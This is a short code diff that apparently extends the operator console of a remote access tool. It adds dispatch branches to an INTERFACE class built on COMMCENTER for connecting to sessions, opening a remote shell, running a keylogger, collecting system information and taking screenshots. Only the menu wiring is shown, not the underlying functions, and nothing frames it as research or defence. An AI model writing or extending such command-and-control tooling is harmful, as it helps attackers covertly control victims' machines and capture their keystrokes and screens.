@@ -537,4 +537,19 @@ class INTERFACE(COMMCENTER):
                 self.c_help(vals)
             elif vals[0] == "sessions":
                 self.c_sessions()
-            
+            elif vals[0] == "ping":
+                self.c_ping(vals)
+            elif vals[0] == "connect":
+                self.c_connect(vals)
+            elif vals[0] == "disconnect":
+                self.c_disconnect()
+            elif vals[0] == "shell":
+                self.c_shell()
+            elif vals[0] == "clear":
+                self.c_clear()
+            elif vals[0] == "keylogger":
+                self.c_keylogger(vals)
+            elif vals[0] == "sysinfo":
+                self.c_sysinfo()
+            elif vals[0] == "screenshot":
+                self.c_screenshot()
